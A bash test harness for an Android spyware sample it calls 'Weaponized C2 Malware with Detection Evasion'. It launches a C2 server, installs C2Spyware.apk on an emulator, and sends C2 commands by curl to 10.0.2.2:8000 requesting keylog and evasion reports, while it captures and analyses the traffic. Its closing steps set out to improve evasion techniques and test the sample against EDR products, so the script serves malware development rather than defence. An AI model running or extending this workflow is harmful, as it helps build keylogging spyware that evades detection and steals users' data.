#!/bin/bash

# Dynamic Analysis Detection Test

echo "⚡ Dynamic Analysis Detection Test"
echo "================================"

echo "📅 Date: $(date)"
echo "📱 Testing: Weaponized C2 Malware with Detection Evasion"

# 1. Start C2 server
echo -e "\n🖥️ Starting C2 Server:"
cd /root/c2_server/
python3 c2_server.py > /root/detection_analysis/network_analysis/c2_server.log 2>&1 &
C2_PID=$!
echo "✅ C2 Server started (PID: $C2_PID)"
sleep 2

# 2. Start network capture
echo -e "\n📡 Starting Network Capture:"
tcpdump -i any -w /root/detection_analysis/network_analysis/network_capture.pcap "host 10.0.2.2" > /dev/null 2>&1 &
TCPDUMP_PID=$!
echo "✅ Network capture started (PID: $TCPDUMP_PID)"

# 3. Start Android emulator with monitoring
echo -e "\n🤖 Starting Android Emulator with Monitoring:"

# Start emulator in background
echo "Starting emulator..."
emulator -avd test_avd -no-snapshot -wipe-data -no-audio -no-window -no-boot-anim -netdelay none -netspeed full -memory 2048 > /dev/null 2>&1 &
EMULATOR_PID=$!
echo "✅ Emulator started (PID: $EMULATOR_PID)"

# Wait for emulator to boot
sleep 60

# 4. Install and run malware
echo -e "\n📱 Installing and Running Malware:"
adb install /root/android_malware/build/C2Spyware.apk > /dev/null 2>&1
adb shell am start -n com.evil.c2spyware/.MainActivity > /dev/null 2>&1

echo "✅ Malware installed and started"

# 5. Monitor behavior
echo -e "\n👀 Monitoring Behavior:"

# Capture logcat
echo "Capturing logcat..."
adb logcat -d > /root/detection_analysis/behavioral_analysis/logcat.txt

# Filter for malware-related logs
grep -i -E "(c2|spyware|behavior|keylog|evasion|encrypt|command|exfil)" /root/detection_analysis/behavioral_analysis/logcat.txt > /root/detection_analysis/behavioral_analysis/malware_logs.txt

# Capture running processes
echo "Capturing running processes..."
adb shell ps > /root/detection_analysis/behavioral_analysis/processes.txt

grep -i "c2" /root/detection_analysis/behavioral_analysis/processes.txt > /root/detection_analysis/behavioral_analysis/malware_processes.txt

# 6. Test C2 communication
echo -e "\n📶 Testing C2 Communication:"

# Send test commands to malware
echo "Sending test commands to malware..."
curl "http://10.0.2.2:8000/command?device_id=test_device&command=behavior_report" > /root/detection_analysis/network_analysis/c2_commands.log
curl "http://10.0.2.2:8000/command?device_id=test_device&command=keylog_report" >> /root/detection_analysis/network_analysis/c2_commands.log
curl "http://10.0.2.2:8000/command?device_id=test_device&command=detection_analysis" >> /root/detection_analysis/network_analysis/c2_commands.log
curl "http://10.0.2.2:8000/command?device_id=test_device&command=evasion_report" >> /root/detection_analysis/network_analysis/c2_commands.log

sleep 10

# 7. Analyze network traffic
echo -e "\n📊 Analyzing Network Traffic:"

tshark -r /root/detection_analysis/network_analysis/network_capture.pcap -Y "http" -w /root/detection_analysis/network_analysis/http_traffic.pcap > /dev/null 2>&1

tshark -r /root/detection_analysis/network_analysis/http_traffic.pcap -Y "http.request or http.response" -T fields -e http.host -e http.request.uri -e http.response.code > /root/detection_analysis/network_analysis/http_analysis.txt

cat /root/detection_analysis/network_analysis/http_analysis.txt

# 8. Analyze behavioral data
echo -e "\n📈 Analyzing Behavioral Data:"

# Extract behavior reports
grep -A 20 -B 5 "behavior_report" /root/detection_analysis/behavioral_analysis/malware_logs.txt > /root/detection_analysis/behavioral_analysis/behavior_report.txt

grep -A 20 -B 5 "keylog_report" /root/detection_analysis/behavioral_analysis/malware_logs.txt > /root/detection_analysis/behavioral_analysis/keylog_report.txt

grep -A 20 -B 5 "detection_analysis" /root/detection_analysis/behavioral_analysis/malware_logs.txt > /root/detection_analysis/behavioral_analysis/detection_analysis.txt

grep -A 20 -B 5 "evasion_report" /root/detection_analysis/behavioral_analysis/malware_logs.txt > /root/detection_analysis/behavioral_analysis/evasion_report.txt

# 9. Clean up
echo -e "\n🧹 Cleaning Up:"

# Stop network capture
kill $TCPDUMP_PID > /dev/null 2>&1

# Stop C2 server
kill $C2_PID > /dev/null 2>&1

# Stop emulator
echo "Stopping emulator..."
adb emu kill > /dev/null 2>&1
kill $EMULATOR_PID > /dev/null 2>&1

# 10. Summary
echo -e "\n📊 Dynamic Analysis Summary:"
echo "==========================="
echo "✅ C2 Server: Started and tested"
echo "✅ Network Capture: Completed"
echo "✅ Emulator: Started and monitored"
echo "✅ Malware Installation: Completed"
echo "✅ Behavior Monitoring: Completed"
echo "✅ C2 Communication: Tested"
echo "✅ Network Analysis: Completed"
echo "✅ Behavioral Analysis: Completed"
echo -e "\n📁 Reports generated:"
echo "   - Logcat: /root/detection_analysis/behavioral_analysis/logcat.txt"
echo "   - Malware Logs: /root/detection_analysis/behavioral_analysis/malware_logs.txt"
echo "   - Processes: /root/detection_analysis/behavioral_analysis/processes.txt"
echo "   - Malware Processes: /root/detection_analysis/behavioral_analysis/malware_processes.txt"
echo "   - Network Capture: /root/detection_analysis/network_analysis/network_capture.pcap"
echo "   - HTTP Analysis: /root/detection_analysis/network_analysis/http_analysis.txt"
echo "   - Behavior Report: /root/detection_analysis/behavioral_analysis/behavior_report.txt"
echo "   - Keylog Report: /root/detection_analysis/behavioral_analysis/keylog_report.txt"
echo "   - Detection Analysis: /root/detection_analysis/behavioral_analysis/detection_analysis.txt"
echo "   - Evasion Report: /root/detection_analysis/behavioral_analysis/evasion_report.txt"
echo -e "\n🔍 Next Steps:"
echo "   1. Review dynamic detection patterns"
echo "   2. Analyze behavioral detection mechanisms"
echo "   3. Study network traffic patterns"
echo "   4. Identify dynamic detection signatures"
echo "   5. Improve dynamic evasion techniques"
echo "   6. Test against EDR solutions"
